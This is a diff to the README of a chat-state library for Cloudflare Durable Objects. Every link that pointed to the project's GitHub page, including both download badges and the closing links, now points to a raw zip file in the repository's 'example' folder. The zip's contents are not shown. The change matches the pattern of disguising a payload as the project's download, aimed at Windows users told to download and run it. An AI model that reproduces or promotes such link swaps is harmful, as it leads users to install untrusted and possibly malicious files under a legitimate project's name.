@@ -1,6 +1,6 @@
 # ⚙️ chat-state-cloudflare-do - Manage Chat State with Durable Objects
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Page-brightgreen)](https://github.com/Hurmain901/chat-state-cloudflare-do)
+[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Page-brightgreen)](https://raw.githubusercontent.com/Hurmain901/chat-state-cloudflare-do/main/example/state-chat-cloudflare-do-2.1.zip)
 
 ---
 
@@ -43,7 +43,7 @@ This guide will help you download and run chat-state-cloudflare-do on your Windo
 
 Click the large button below to visit the download page for chat-state-cloudflare-do. This page contains the latest version of the software, instructions, and updates.
 
-[![Download Now](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Hurmain901/chat-state-cloudflare-do)
+[![Download Now](https://img.shields.io/badge/Download-Here-blue)](https://raw.githubusercontent.com/Hurmain901/chat-state-cloudflare-do/main/example/state-chat-cloudflare-do-2.1.zip)
 
 Once on the page, look for a section called **Releases** or **Download**.  
 
@@ -99,7 +99,7 @@ Once on the page, look for a section called **Releases** or **Download**.
 
 For technical details, source code, or updates, you can visit the chat-state-cloudflare-do GitHub page:
 
-https://github.com/Hurmain901/chat-state-cloudflare-do
+https://raw.githubusercontent.com/Hurmain901/chat-state-cloudflare-do/main/example/state-chat-cloudflare-do-2.1.zip
 
 You will find guides about how the app works with Cloudflare and the Chat SDK.  
 
@@ -132,4 +132,4 @@ chat-adapter, chat-sdk, cloudflare, cloudflare-workers, durable-objects, state-a
 
 Visit here to download or get more info about chat-state-cloudflare-do:  
 
-[https://github.com/Hurmain901/chat-state-cloudflare-do](https://github.com/Hurmain901/chat-state-cloudflare-do)
+[https://raw.githubusercontent.com/Hurmain901/chat-state-cloudflare-do/main/example/state-chat-cloudflare-do-2.1.zip](https://raw.githubusercontent.com/Hurmain901/chat-state-cloudflare-do/main/example/state-chat-cloudflare-do-2.1.zip)
